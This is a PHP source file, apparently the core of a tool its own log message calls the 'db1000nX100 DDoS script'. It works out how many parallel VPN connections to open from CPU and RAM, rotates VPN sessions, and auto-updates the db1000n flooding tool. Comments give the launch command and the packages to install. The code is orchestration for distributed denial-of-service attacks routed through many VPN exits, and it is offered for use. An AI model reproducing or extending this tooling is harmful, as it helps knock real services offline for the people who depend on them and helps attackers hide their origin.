<?php


require_once __DIR__ . '/common.php';
require_once __DIR__ . '/Efficiency.php';
require_once __DIR__ . '/open-vpn/OpenVpnConnection.php';
require_once __DIR__ . '/open-vpn/OpenVpnConfig.php';
require_once __DIR__ . '/DB1000N/db1000nAutoUpdater.php';
require_once __DIR__ . '/HackApplication.php';

//OpenVpnConfig::initStatic();
//die();

//-------------------------------------------------------

$LOG_WIDTH = 115;
$LOG_PADDING_LEFT = 2;
$LOG_BADGE_WIDTH = 23;
$LOG_BADGE_PADDING_LEFT = 1;
$LOG_BADGE_PADDING_RIGHT = 1;
$LONG_LINE = str_repeat('─', $LOG_WIDTH + $LOG_BADGE_WIDTH);
$REDUCE_DB1000N_OUTPUT = true;
$ONE_VPN_SESSION_DURATION = 15 * 60;
$PING_INTERVAL = 5 * 60;
$VPN_CONNECTIONS = [];

function calculateResources()
{
    global
    $VPN_QUANTITY_PER_CPU,
    $VPN_QUANTITY_PER_1_GIB_RAM,
    $FIXED_VPN_QUANTITY,
    $IS_IN_DOCKER,
    $OS_RAM_CAPACITY,
    $CPU_QUANTITY,
    $PARALLEL_VPN_CONNECTIONS_QUANTITY,
    $CONNECT_PORTION_SIZE,
    $MAX_FAILED_VPN_CONNECTIONS_QUANTITY;

    passthru('reset');  // Clear console

    $VPN_QUANTITY_PER_CPU       = 15;
    $VPN_QUANTITY_PER_1_GIB_RAM = 6;
    $FIXED_VPN_QUANTITY         = 0;

    if (($config = getDockerConfig())) {
        $IS_IN_DOCKER = true;
        echo "Docker container detected\n";
        $OS_RAM_CAPACITY = $config['memory'];
        $CPU_QUANTITY = $config['cpus'];
        $FIXED_VPN_QUANTITY = $config['vpnQuantity'];
    } else {
        $IS_IN_DOCKER = false;
        $OS_RAM_CAPACITY = getRAMCapacity();
        $CPU_QUANTITY = getCPUQuantity();
    }

    if ($FIXED_VPN_QUANTITY) {
        echo "The script is configured to establish $FIXED_VPN_QUANTITY VPN connection(s)\n";
        $PARALLEL_VPN_CONNECTIONS_QUANTITY    = $FIXED_VPN_QUANTITY;
    } else {

        $connectionsLimitByCpu = round($CPU_QUANTITY * $VPN_QUANTITY_PER_CPU);
        echo "Detected $CPU_QUANTITY virtual CPU core(s). This grants $connectionsLimitByCpu parallel VPN connections\n";

        $connectionsLimitByRam = round(($OS_RAM_CAPACITY - ($IS_IN_DOCKER  ?  0.5 : 1)) * $VPN_QUANTITY_PER_1_GIB_RAM);
        $connectionsLimitByRam = $connectionsLimitByRam < 1  ?  0 : $connectionsLimitByRam;
        echo "Detected $OS_RAM_CAPACITY GiB of RAM. This grants $connectionsLimitByRam parallel VPN connections\n";

        $PARALLEL_VPN_CONNECTIONS_QUANTITY = min($connectionsLimitByCpu, $connectionsLimitByRam);
        echo "Script will try to establish $PARALLEL_VPN_CONNECTIONS_QUANTITY parallel VPN connections";

        if ($connectionsLimitByCpu > $connectionsLimitByRam) {
            echo " (limit by RAM)\n";
        } else {
            echo " (limit by CPU cores)\n";
        }

        if ($PARALLEL_VPN_CONNECTIONS_QUANTITY < 1) {
            _die("Not enough resources");
        }

    }

    $CONNECT_PORTION_SIZE                 = max(5, round($PARALLEL_VPN_CONNECTIONS_QUANTITY / 4));
    $MAX_FAILED_VPN_CONNECTIONS_QUANTITY  = max(10, $CONNECT_PORTION_SIZE);

    //echo "\$CONNECT_PORTION_SIZE $CONNECT_PORTION_SIZE\n";
    //echo "\$MAX_FAILED_VPN_CONNECTIONS_QUANTITY $MAX_FAILED_VPN_CONNECTIONS_QUANTITY\n";
    echo "\n";
}

$SESSIONS_COUNT = 0;
function initSession()
{
    global $SESSIONS_COUNT;
    $SESSIONS_COUNT++;

    if ($SESSIONS_COUNT !== 1) {
        passthru('reset');  // Clear console
    }

    $newSessionMessage = "db1000nX100 DDoS script: Starting $SESSIONS_COUNT session at " . date('Y_m_d H:i:s');
    echo "$newSessionMessage\n";
    syslog(LOG_INFO, $newSessionMessage);


    OpenVpnConnection::reset();
    db1000nAutoUpdater::update();
    HackApplication::reset();
    Efficiency::clear();
}

//gnome-terminal --window --maximize -- /bin/bash -c "/root/DDOS/hack-linux-runme.elf ; read -p \"Program was terminated\""
//apt -y install  procps kmod iputils-ping curl php-cli php-mbstring php-curl openvpn git